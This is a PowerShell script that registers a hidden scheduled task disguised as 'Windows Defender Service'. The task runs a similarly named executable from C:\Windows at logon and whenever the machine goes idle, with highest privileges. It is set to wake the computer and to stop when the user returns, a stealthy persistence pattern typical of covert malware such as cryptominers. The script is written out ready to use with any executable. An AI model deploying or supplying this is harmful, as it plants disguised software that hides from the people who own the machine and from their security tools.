$TaskName = "Windows Defender Service"  # Changed task name
$ExePath = "C:\Windows\Windows Defender Service.exe" # Replace with your EXE path

$Action = New-ScheduledTaskAction -Execute $ExePath

# Trigger at log on of any user AND after being idle for 1 minute
$LogonTrigger = New-ScheduledTaskTrigger -AtLogOn
$IdleTrigger = New-ScheduledTaskTrigger -Idle -IdleTime 1

# Combine the triggers
$Trigger = $LogonTrigger, $IdleTrigger

$Settings = New-ScheduledTaskSettingsSet -Hidden -AllowDemandStart -AllowHardTerminate -WakeToRun

# Use the current user's credentials
$Principal = New-ScheduledTaskPrincipal -UserId ([System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value) -RunLevel Highest

# Create the scheduled task
Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal -Force

# Get the scheduled task object
$Task = Get-ScheduledTask -TaskName $TaskName

# Disable the "Start the task only if the computer is on AC power" condition
$Task.Settings.DisallowStartIfOnBatteries = $false

# Set the task to hidden
$Task.Settings.Hidden = $true

# Stop if the computer ceases to be idle
$Task.Settings.StopIfGoingOnBatteries = $false
$Task.Settings.StopIfIdleEnd = $true

# Update the task using the -InputObject parameter
Set-ScheduledTask -InputObject $Task
